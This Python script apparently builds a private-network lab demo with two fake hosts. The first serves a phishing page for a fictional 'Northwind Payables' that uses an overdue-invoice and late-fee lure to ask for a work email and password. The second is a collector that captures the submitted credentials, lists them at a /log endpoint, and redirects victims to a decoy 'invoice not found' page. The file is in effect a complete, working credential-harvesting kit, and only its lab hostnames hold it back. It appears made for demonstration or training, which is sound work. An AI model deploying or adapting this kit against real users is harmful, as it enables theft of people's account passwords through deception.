"""Burn Box lab: demo assets on the private lab network only (no route to the internet).

invoices-portal.lab.test  a fake invoice sign-in page (phish_page), made for the demo
collector.lab.test        where that page sends what is typed into it; it keeps the last captures
                          in memory so the trace has somewhere observable to land
"""
import json
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

CAPTURES = []

PHISH = """<!doctype html><html><head><meta charset="utf-8"><title>Northwind Payables: Invoice #88213</title>
<style>body{font:15px/1.5 Arial,sans-serif;background:#f3f5f9;margin:0}.top{background:#1d3a8a;color:#fff;padding:14px 24px;font-weight:700}
.card{max-width:360px;margin:48px auto;background:#fff;border:1px solid #d8dde8;border-radius:8px;padding:26px}
h1{font-size:19px;margin:0 0 6px}p{color:#555;margin:0 0 16px;font-size:13px}label{display:block;font-size:12px;color:#444;margin:10px 0 4px}
input{width:100%;box-sizing:border-box;padding:9px;border:1px solid #c5cbd8;border-radius:4px}button{margin-top:16px;width:100%;padding:10px;background:#2c4bd6;color:#fff;border:0;border-radius:4px;font-weight:700}
.warn{background:#fff4e5;border:1px solid #f3c27a;color:#7a4b00;padding:8px 10px;border-radius:4px;font-size:12px;margin-bottom:12px}</style></head>
<body><div class="top">Northwind Payables</div><div class="card"><div class="warn">Invoice #88213 is 14 days overdue.</div>
<h1>Sign in to view invoice #88213</h1><p>Use your work email to see the invoice and avoid a late fee.</p>
<form method="post" action="http://collector.lab.test/harvest"><label>Work email</label><input type="email" name="email" autocomplete="off">
<label>Password</label><input type="password" name="password"><button type="submit">Sign In</button></form></div>
<p style="text-align:center;font-size:11px;color:#999">Burn Box demo page. Not a real company.</p></body></html>"""

MISSING = """<!doctype html><html><head><meta charset="utf-8"><title>Invoice not found</title></head>
<body style="font:15px Arial;padding:60px;text-align:center;color:#555">Invoice not found. It may have been paid already.</body></html>"""


class Lab(BaseHTTPRequestHandler):
    server_version = "lab"

    def host(self):
        return (self.headers.get("Host") or "").split(":")[0].lower()

    def send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        h = self.host()
        if h == "invoices-portal.lab.test" and self.path.startswith("/missing"):
            return self.send(200, MISSING)
        if h == "invoices-portal.lab.test":
            return self.send(200, PHISH)
        if h == "collector.lab.test" and self.path == "/log":
            return self.send(200, json.dumps(CAPTURES[-20:]), "application/json")
        return self.send(404, "not found", "text/plain")

    def do_POST(self):
        n = min(int(self.headers.get("Content-Length") or 0), 65536)
        body = self.rfile.read(n).decode("utf-8", "replace")
        if self.host() == "collector.lab.test":
            fields = {k: v[0] for k, v in parse_qs(body).items()}
            CAPTURES.append({"t": time.time(), "path": self.path, "fields": fields})
            del CAPTURES[:-100]
            print(json.dumps({"captured": list(fields)}), flush=True)
            return self.send(302, "", extra={"Location": "http://invoices-portal.lab.test/missing"})
        return self.send(405, "no", "text/plain")

    def log_message(self, fmt, *args):
        pass


if __name__ == "__main__":
    ThreadingHTTPServer(("0.0.0.0", 80), Lab).serve_forever()
